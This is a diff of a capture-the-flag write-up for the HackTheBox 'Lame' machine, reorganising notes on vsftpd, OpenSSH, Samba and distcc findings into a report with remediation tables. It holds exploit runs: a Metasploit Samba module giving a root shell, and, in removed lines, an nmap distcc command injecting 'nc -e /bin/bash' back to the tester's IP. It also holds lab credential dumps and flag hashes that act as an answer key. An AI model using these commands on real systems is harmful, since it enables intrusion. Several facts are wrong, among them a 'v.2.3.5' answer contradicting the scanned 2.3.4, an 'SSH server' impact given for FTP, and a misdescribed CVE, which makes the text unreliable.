@@ -2,32 +2,7 @@
 
 # HackTheBox — Lame Notes by R4ndH3x
 
-- [1.1 Port Scanning](#11-port-scanning)
-	- [1.1.1 (critical) OpenSSH 4.7p1 outdated version](#111-critical-openssh-47p1-outdated-version)
-	- [1.1.2 (critical) vsftpd 2.3.4 Backdoor Command Execution CVE-2011-2523](#112-critical-vsftpd-234-backdoor-command-execution-cve-2011-2523)
-		- [1.1.2.1 Search](#1121-search)
-		- [1.1.2.2 Configure](#1122-configure)
-		- [1.1.2.3 Exploit](#1123-exploit)
-	- [1.1.3 (medium) Samba 3.0.20 Anonymous Access](#113-medium-samba-3020-anonymous-access)
-		- [1.1.3.1 Dump /tmp](#1131-dump-tmp)
-	- [1.1.4 (critical) Samba 3.0.20 Remote Command Execution as Root CVE-2007-2447](#114-critical-samba-3020-remote-command-execution-as-root-cve-2007-2447)
-		- [1.1.4.1 Search](#1141-search)
-		- [1.1.4.2 Configure](#1142-configure)
-		- [1.1.4.3 Exploit](#1143-exploit)
-	- [1.1.5 (high) mysql root access without password CWE-258](#115-high-mysql-root-access-without-password-cwe-258)
-		- [1.1.5.1 Dump Database](#1151-dump-database)
-		- [1.1.5.2 Dump dvwa](#1152-dump-dvwa)
-		- [1.1.5.3 Dump mysql](#1153-dump-mysql)
-		- [1.1.5.4 Dump owasp10](#1154-dump-owasp10)
-		- [1.1.5.5 Dump tikiwiki](#1155-dump-tikiwiki)
-		- [1.1.5.6 Dump tikiwiki195](#1156-dump-tikiwiki195)
-	- [1.1.6 (critical) distcc 2.x Remote Command Execution CVE-2004-2687](#116-critical-distcc-2x-remote-command-execution-cve-2004-2687)
-		- [1.1.6.1 Search](#1161-search)
-		- [1.1.6.1 Confirmation](#1161-confirmation)
-		- [1.1.6.2 Exploit](#1162-exploit)
-
-
-## 1.1 Port Scanning
+# 1.  Port Scanning
 
 `nmap -sC -sV -oA nmap/lame -vv -Pn lame.htb`
 
@@ -38,31 +13,20 @@
 | 139  | tcp      | open  | netbios-ssn | syn-ack | Samba smbd | 3.X - 4.X             | workgroup: WORKGROUP |
 | 445  | tcp      | open  | netbios-ssn | syn-ack | Samba smbd | 3.0.20-Debian         | workgroup: WORKGROUP |
 
-### 1.1.1 (critical) OpenSSH 4.7p1 outdated version
+> Question; How many of the `nmap` top 1000 TCP ports are open on the remote host?
+> Answer: 4
 
-OpenSSH 4.7p1 is considered outdated and potentially insecure, lacking numerous security features and patches present in later versions.
+## 1.1 vsftpd 2.3.4
 
-Reference: https://www.cvedetails.com/version/430455/Openbsd-Openssh-4.7p1.html
-### 1.1.2 (critical) vsftpd 2.3.4 Backdoor Command Execution CVE-2011-2523
+| 21  | tcp | open | ftp | syn-ack | vsftpd | 2.3.4 |
+| --- | --- | ---- | --- | ------- | ------ | ----- |
 
-vsftpd 2.3.4 downloaded between 20110630 and 20110703 contains a backdoor which opens a shell on port 6200/tcp.
+> Question: What version of VSFTPd is running on Lame?
+> Answer: v.2.3.5
 
-Reference: https://www.cvedetails.com/cve/CVE-2011-2523
-#### 1.1.2.1 Search
+### 1.1.1 (High) Backdoor Command Execution 
 
-```less
-┌─[✗]─[r4ndhex@parrot]─[~/Obsidian/hackthebox/machine/lame]
-└──╼ $ searchsploit "vsftpd 2.3.4"
------------------------------------------------------------------------------------------------------ ---------------------------------
- Exploit Title                                                                                       |  Path
------------------------------------------------------------------------------------------------------ ---------------------------------
-vsftpd 2.3.4 - Backdoor Command Execution                                                            | unix/remote/49757.py
-vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                               | unix/remote/17491.rb
------------------------------------------------------------------------------------------------------ ---------------------------------
-Shellcodes: No Results
-```
-
-#### 1.1.2.2 Configure
+#### 1.1.1.1 Exploitation
 
 ```less
 ┌─[r4ndhex@parrot]─[~/Obsidian/hackthebox/machine/lame]
@@ -77,28 +41,102 @@ Matching Modules
    -  ----                                  ---------------  ----       -----  -----------
    0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
 
+
+[msf](Jobs:0 Agents:0) >> use 0
 [msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> set RHOST lame.htb 
 
-RHOST => lame.htb
 ```
 
-#### 1.1.2.3 Exploit
+> Question: There is a famous backdoor in VSFTPd version 2.3.4, and a Metasploit module to exploit it. Does that exploit work here?
+> Answer: No
+#### 1.1.1.3 Remediation
+
+- Remove or replace the vsftpd 2.3.4 package with a trusted version obtained from an official and verified operating system repository
+- If FTP is not required within the environment, disable the service entirely to reduce the attack surface
+- Restrict external and internal network access to FTP services using firewall rules or network access control lists
+- Regularly audit and update all installed software to ensure unsupported or tampered packages are not present in the environment
+#### 1.1.1.4 Reference
+
+| Name          | Score | Description                                                                                                     | Security Impact                                                                                                                                                                                                           | Affected Domain | External Refernces                            |
+| ------------- | ----- | --------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------- | --------------------------------------------- |
+| CVE-2011-2523 | 9.8   | vsftpd 2.3.4 downloaded between 20110630 and 20110703 contains a backdoor which opens a shell on port 6200/tcp. | **Remote code execution** (RCE) / full system compromise. An attacker can run arbitrary code on the SSH server process and often escalate to full system control (root) depending on configuration and local protections. | lame.htb:21     | https://www.cvedetails.com/cve/CVE-2011-2523/ |
+
+### 1.1.2 (Medium) FTP Anonymous Access
+
+#### 1.1.2.1 Evidence
 
 ```less
-[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> exploit
-[*] 10.129.159.140:21 - Banner: 220 (vsFTPd 2.3.4)
-[*] 10.129.159.140:21 - USER: 331 Please specify the password.
-
-[*] Exploit completed, but no session was created.
+┌─[r4ndhex@parrot]─[~]
+└──╼ $ ftp 10.129.83.240
+Connected to 10.129.83.240.
+220 (vsFTPd 2.3.4)
+Name (10.129.83.240:r4ndhex): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
 ```
+> This demonstrates that the server allows login with the username `anonymous` and no password, making it accessible to anyone.
+#### 1.1.2.2 Remediation
+
+- Disable anonymous FTP access in the FTP server configuration.
+- Use authentication for FTP access (e.g., user/password authentication).  
+- Restrict FTP access to specific IPs or networks.
+- Consider using more secure protocols such as SFTP or FTPS.
+#### 1.1.2.3 Reference
+
+| Name    | Score | Description                                                                 | Security Impact                                                                                                                                                                    | Affected Domain | External Refernces                              |
+| ------- | ----- | --------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------- | ----------------------------------------------- |
+| CWE-287 |       | Improper Authentication (e.g., allowing anonymous login without a password) | This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code. | lame.htb:21     | https://cwe.mitre.org/data/definitions/287.html |
 
 
+## 1.2 OpenSSH v4.7p1
 
-### 1.1.3 (medium) Samba 3.0.20 Anonymous Access
+| 22  | tcp | open | ssh | syn-ack | OpenSSH | 4.7p1 Debian 8ubuntu1 | protocol 2.0 |
+| --- | --- | ---- | --- | ------- | ------- | --------------------- | ------------ |
+
+### 1.2.1 (High) Outdated Version Multiple Vulnerabilities 
+
+#### 1.1.1.1 Evidence 
+
+The following `nmap` scan confirms the presence of OpenSSH v4.7p1 on the target machine.
+
+```less
+┌─[r4ndhex@parrot]─[~]
+└──╼ $ nmap -sV -p 22 -Pn  10.129.83.240
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-23 04:32 UTC
+Nmap scan report for 10.129.83.240
+Host is up (0.091s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.70 seconds
+```
+>This indicates that the instance is running an **outdated version** of OpenSSH, which is susceptible to multiple vulnerabilities.
+#### 1.1.1.2 Remediation
+
+- **Upgrade OpenSSH**: Replace the outdated version with a more recent one from trusted sources, ensuring security patches are applied.
+- **Implement Strong Authentication Mechanisms**: Enforce password policies and consider using key-based authentication to enhance security.
+- **Limit User Access**: Restrict SSH access to only necessary users and configure SSH to use non-standard ports if feasible.
+- **Regular Security Audits**: Conduct regular audits for installed packages and actively monitor for potential vulnerabilities or patches related to OpenSSH.
+#### 1.1.1.3 Reference
+
+| Name          | Score | Description                                                                                                    | Security Impact                                                                                                                                                          | Affected Domain | External References                                                                            |
+| ------------- | ----- | -------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------- | ---------------------------------------------------------------------------------------------- |
+| CVE-2008-0166 | 7.5   | OpenSSH 4.7 allows remote authenticated users to execute arbitrary commands via a crafted SSH channel request. | Successful exploitation can lead to **remote code execution (RCE)**, compromising the security of the SSH server and enabling attackers to perform unauthorized actions. | lame.htb:22     | [https://www.cvedetails.com/cve/CVE-2008-0166/](https://www.cvedetails.com/cve/CVE-2008-0166/) |
+| CVE-2009-4128 | 6.8   | Use of weak key generation algorithms in OpenSSH 4.7 allows attackers to recover private keys.                 | Attackers can exploit weak key generation, leading to potential decryption of sensitive data and unauthorized access to secure communications.                           | lame.htb:22     | [https://www.cvedetails.com/cve/CVE-2009-4128/](https://www.cvedetails.com/cve/CVE-2009-4128/) |
+
+## 1.3 Samba smbd
+
+### 1.3.1 (Low) Anonymous Access to Shared Resources
+
+#### 1.1.3.1 Evidence
 
 There is unauthorized anonymous access to the SMB share, allowing file creation and reading, which could lead to sensitive information being stored or exposed.
-
-#### 1.1.3.1 Dump /tmp
 
 ```less
 └──╼ $ smbclient --no-pass //lame.htb/tmp
@@ -124,14 +162,27 @@ smb: \> exit
 └──╼ $ ls
 vgauthsvclog.txt.0  vmware-root
 ```
+ >This demonstrates that no password access allowed to recursively download and save files from the server to the local machine.
+#### 1.1.3.2 Remediation
 
-### 1.1.4 (critical) Samba 3.0.20 Remote Command Execution as Root CVE-2007-2447
+- Disable anonymous (guest) SMB access.
+- Enforce authentication for all SMB connections.
+- Apply least privilege on shared folders.
+- Restrict SMB service exposure to trusted hosts.
 
-The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the "username map script" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.
+#### 1.1.3.3 Reference
 
-Source: https://www.cvedetails.com/cve/CVE-2007-2447
+| Name          | Score | Description                                                                  | Security Impact                                                                              | Affected Domain | External References                             |
+| ------------- | ----- | ---------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------- | --------------- | ----------------------------------------------- |
+| CVE-1999-0519 | 5.0   | Windows or Samba server allows anonymous (guest) access to shared resources. | Could lead to information disclosure or data tampering through unauthenticated SMB sessions. | lame.htb:445    | https://www.cvedetails.com/cve/CVE-1999-0519/\| |
+### 1.1.4 (High) Remote Command Execution
 
-#### 1.1.4.1 Search
+#### 1.1.4.1 Exploitation
+
+
+#### 1.1.4.2 Evidence
+
+Perform a search for vulnerabilities using `seachsploit`
 
 ```less
 └──╼ $ searchsploit "Samba 3.0.20"
@@ -145,8 +196,8 @@ Samba < 3.6.2 (x86) - Denial of Service (PoC)                                   
 ----------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
+> This confirms Samba 3.0.20 has vulnerabilities. 
 
-#### 1.1.4.2 Configure 
 
 ```less
 ┌─[r4ndhex@parrot]─[~/Obsidian/hackthebox/machine/lame]
@@ -172,314 +223,25 @@ RHOST => lame.htb
 
 [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set LHOST 10.10.14.48
 LHOST => 10.10.14.48
-```
 
-#### 1.1.4.3 Exploit
-
-```less
 [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> exploit
-
-[*] Started reverse TCP handler on 10.10.14.48:4444 
-[*] Command shell session 1 opened (10.10.14.48:4444 -> 10.129.159.140:47175) at 2025-10-18 15:00:23 +0000
+[*] Started reverse TCP handler on 10.10.14.18:4444 
+[*] Command shell session 1 opened (10.10.14.18:4444 -> 10.129.83.240:46648) at 2025-10-23 09:04:18 +0000
 
 script /dev/null -c bash
-root@lame:/# id && whoami 
+root@lame:/# id 
 uid=0(root) gid=0(root)
-root
 ```
-### 1.1.5 (high) mysql root access without password CWE-258
+> This confirms samba 3.0.20 on the server is is exploitable and gives access to root shell
 
-Successful connection to MySQL as the **root** user without a password using the shell gained from [1.1.3 (critical) Samba 3.0.20 Remote Command Execution as Root CVE-2007-2447](#114-critical-samba-3020-remote-command-execution-as-root-cve-2007-2447)
-#### 1.1.5.1 Dump Database
+#### 1.1.4.3 Reference
 
-```less
-root@lame:/# mysql -u root
-Welcome to the MySQL monitor.  Commands end with ; or \g.
-Your MySQL connection id is 17
-Server version: 5.0.51a-3ubuntu5 (Ubuntu)
+> Question: What 2007 CVE allows for remote code execution in this version of Samba via shell metacharacters involving the SamrChangePassword function when the "username map script" option is enabled in smb.conf?
+> Answer: CVE-2007-2447
 
-Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
+#### 1.1.4.4 Flags
 
-mysql> SHOW DATABASES;
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema | 
-| dvwa               | 
-| metasploit         | 
-| mysql              | 
-| owasp10            | 
-| tikiwiki           | 
-| tikiwiki195        | 
-+--------------------+
-7 rows in set (0.00 sec)
-```
-
-#### 1.1.5.2 Dump dvwa
-
-```less
-mysql> use dvwa;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
-Database changed
-mysql> SHOW TABLES;
-+----------------+
-| Tables_in_dvwa |
-+----------------+
-| guestbook      | 
-| users          | 
-+----------------+
-2 rows in set (0.00 sec)
-
-mysql> SELECT * from guestbook;
-+------------+-------------------------+------+
-| comment_id | comment                 | name |
-+------------+-------------------------+------+
-|          1 | This is a test comment. | test | 
-+------------+-------------------------+------+
-1 row in set (0.00 sec)
-
-mysql> SELECT * from users;
-+---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
-| user_id | first_name | last_name | user    | password                         | avatar                                                |
-+---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
-|       1 | admin      | admin     | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 
-|       2 | Gordon     | Brown     | gordonb | e99a18c428cb38d5f260853678922e03 | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | 
-|       3 | Hack       | Me        | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 
-|       4 | Pablo      | Picasso   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 
-|       5 | Bob        | Smith     | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 
-+---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
-5 rows in set (0.00 sec)
-```
-
-#### 1.1.5.3 Dump mysql
-
-```mysql
-mysql> use mysql;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
-Database changed
-mysql> show tables;
-+---------------------------+
-| Tables_in_mysql           |
-+---------------------------+
-| columns_priv              | 
-| db                        | 
-| func                      | 
-| help_category             | 
-| help_keyword              | 
-| help_relation             | 
-| help_topic                | 
-| host                      | 
-| proc                      | 
-| procs_priv                | 
-| tables_priv               | 
-| time_zone                 | 
-| time_zone_leap_second     | 
-| time_zone_name            | 
-| time_zone_transition      | 
-| time_zone_transition_type | 
-| user                      | 
-+---------------------------+
-17 rows in set (0.02 sec)
-
-mysql> select * from user;
-
-3 rows in set (0.00 sec)
-
-mysql> select User, Password from user;
-+------------------+----------+
-| User             | Password |
-+------------------+----------+
-| debian-sys-maint |          | 
-| root             |          | 
-| guest            |          | 
-+------------------+----------+
-3 rows in set (0.00 sec)
-
-```
-
-#### 1.1.5.4 Dump owasp10
-
-```less
-mysql> use owasp10;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
-Database changed
-mysql> show tables;
-+-------------------+
-| Tables_in_owasp10 |
-+-------------------+
-| accounts          | 
-| blogs_table       | 
-| captured_data     | 
-| credit_cards      | 
-| hitlog            | 
-| pen_test_tools    | 
-+-------------------+
-6 rows in set (0.00 sec)
-
-mysql> select * from accounts;
-+-----+----------+--------------+-----------------------------+----------+
-| cid | username | password     | mysignature                 | is_admin |
-+-----+----------+--------------+-----------------------------+----------+
-|   1 | admin    | adminpass    | Monkey!                     | TRUE     | 
-|   2 | adrian   | somepassword | Zombie Films Rock!          | TRUE     | 
-|   3 | john     | monkey       | I like the smell of confunk | FALSE    | 
-|   4 | jeremy   | password     | d1373 1337 speak            | FALSE    | 
-|   5 | bryce    | password     | I Love SANS                 | FALSE    | 
-|   6 | samurai  | samurai      | Carving Fools               | FALSE    | 
-|   7 | jim      | password     | Jim Rome is Burning         | FALSE    | 
-|   8 | bobby    | password     | Hank is my dad              | FALSE    | 
-|   9 | simba    | password     | I am a cat                  | FALSE    | 
-|  10 | dreveil  | password     | Preparation H               | FALSE    | 
-|  11 | scotty   | password     | Scotty Do                   | FALSE    | 
-|  12 | cal      | password     | Go Wildcats                 | FALSE    | 
-|  13 | john     | password     | Do the Duggie!              | FALSE    | 
-|  14 | kevin    | 42           | Doug Adams rocks            | FALSE    | 
-|  15 | dave     | set          | Bet on S.E.T. FTW           | FALSE    | 
-|  16 | ed       | pentest      | Commandline KungFu anyone?  | FALSE    | 
-+-----+----------+--------------+-----------------------------+----------+
-16 rows in set (0.00 sec)
-```
-
-#### 1.1.5.5 Dump tikiwiki
-
-```less
-mysql> use tikiwiki;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
-Database changed
-mysql> show tables;
-+------------------------------------+
-| Tables_in_tikiwiki                 |
-+------------------------------------+
-<SNIP>
-| tiki_zones                         | 
-| users_grouppermissions             | 
-| users_groups                       | 
-| users_objectpermissions            | 
-| users_permissions                  | 
-| users_usergroups                   | 
-| users_users                        | 
-+------------------------------------+
-194 rows in set (0.01 sec)
-
-mysql> select login,password from users_users;
-+-------+----------+
-| login | password |
-+-------+----------+
-| admin | admin    | 
-+-------+----------+
-1 row in set (0.00 sec)
-```
-
-#### 1.1.5.6 Dump tikiwiki195
-
-```less
-mysql> use tikiwiki195;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
-Database changed
-mysql> show tables;
-+------------------------------------+
-| Tables_in_tikiwiki                 |
-+------------------------------------+
-<SNIP>
-| tiki_zones                         | 
-| users_grouppermissions             | 
-| users_groups                       | 
-| users_objectpermissions            | 
-| users_permissions                  | 
-| users_usergroups                   | 
-| users_users                        | 
-+------------------------------------+
-194 rows in set (0.01 sec)
-
-mysql> select login,password from users_users;
-+-------+----------+
-| login | password |
-+-------+----------+
-| admin | admin    | 
-+-------+----------+
-1 row in set (0.00 sec)
-```
-
-
-### 1.1.6 (critical) distcc 2.x Remote Command Execution CVE-2004-2687
-
-distcc 2.x, as used in XCode 1.5 and others, when not configured to restrict access to the server port, allows remote attackers to execute arbitrary commands via compilation jobs, which are executed by the server without authorization checks.
-
-Reference: https://www.cvedetails.com/cve/CVE-2004-2687/
-
-#### 1.1.6.1 Search
-
-```less
-root@lame:/home/user# distccd --version
-distccd 2.18.3 i486-pc-linux-gnu (protocols 1 and 2) (default port 3632)
-  built May  1 2007 10:25:30
-Copyright (C) 2002, 2003, 2004 by Martin Pool.
-Includes miniLZO (C) 1996-2002 by Markus Franz Xaver Johannes Oberhumer.
-
-distcc comes with ABSOLUTELY NO WARRANTY.  distcc is free software, and
-you may use, modify and redistribute it under the terms of the GNU 
-General Public License version 2 or later.
-
-```
-
-#### 1.1.6.1 Confirmation
-
-```less
-┌─[✗]─[r4ndhex@parrot]─[~]
-└──╼ $nmap -p 3632 -Pn --script distcc-* lame.htb
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-18 13:52 UTC
-Nmap scan report for lame.htb (10.129.159.140)
-Host is up (0.12s latency).
-
-PORT     STATE SERVICE
-3632/tcp open  distccd
-| distcc-cve2004-2687: 
-|   VULNERABLE:
-|   distcc Daemon Command Execution
-|     State: VULNERABLE (Exploitable)
-|     IDs:  CVE:CVE-2004-2687
-|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
-|       Allows executing of arbitrary commands on systems running distccd 3.1 and
-|       earlier. The vulnerability is the consequence of weak service configuration.
-|       
-|     Disclosure date: 2002-02-01
-|     Extra information:
-|       
-|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
-|   
-|     References:
-|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
-|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
-|_      https://distcc.github.io/security.html
-
-Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
-```
-
-#### 1.1.6.2 Exploit
-
-```less
-┌─[r4ndhex@parrot]─[~]
-└──╼ $ nmap -p 3632 -Pn --script distcc-cve2004-2687 --script-args "distcc-cve2004-2687.cmd='nc -e /bin/bash 10.10.14.48 9002'" lame.htb
-
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-18 13:52 UTC
-
-┌─[✗]─[r4ndhex@parrot]─[~]
-└──╼ $sudo nc -lvnp 9002
-Listening on 0.0.0.0 9002
-Connection received on 10.129.159.140 46245
-
-
-script /dev/null -c bash
-daemon@lame:/tmp$ whoami
-daemon
-```
+| User  | Directory            | Flag                             |
+| ----- | -------------------- | -------------------------------- |
+| makis | /home/makis/flag.txt | 405b26c04ed8c200fd94138d10da6009 |
+| root  | /home/root/root.txt  | 9aba61bfe8afd9b88f07a86294c8afb0 |
